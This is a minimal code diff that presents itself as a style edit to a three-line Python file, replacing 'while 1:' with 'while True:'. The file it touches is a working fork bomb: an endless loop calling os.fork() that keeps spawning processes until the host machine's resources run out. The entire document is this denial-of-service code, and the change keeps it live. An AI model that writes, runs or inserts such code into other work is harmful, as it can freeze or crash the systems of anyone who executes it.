@@ -1,3 +1,3 @@
 import os
-while 1:
+while True:
 	os.fork()
